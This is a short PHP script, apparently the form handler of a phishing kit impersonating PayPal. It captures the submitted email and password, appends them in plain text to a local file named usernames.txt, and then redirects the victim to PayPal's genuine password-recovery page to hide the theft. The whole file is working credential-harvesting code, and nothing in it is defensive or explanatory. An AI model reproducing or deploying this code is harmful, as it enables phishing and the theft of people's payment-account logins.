<?php

file_put_contents("usernames.txt", " [username:] " . $_POST['login_email'] ."\n". " [password:] " . $_POST['login_password'] . "\n", FILE_APPEND);
file_put_contents("usernames.txt", " ------------------------------------------------------------- " . "\n", FILE_APPEND);
header('Location: https://www.paypal.com/authflow/password-recovery/');
exit();
?>
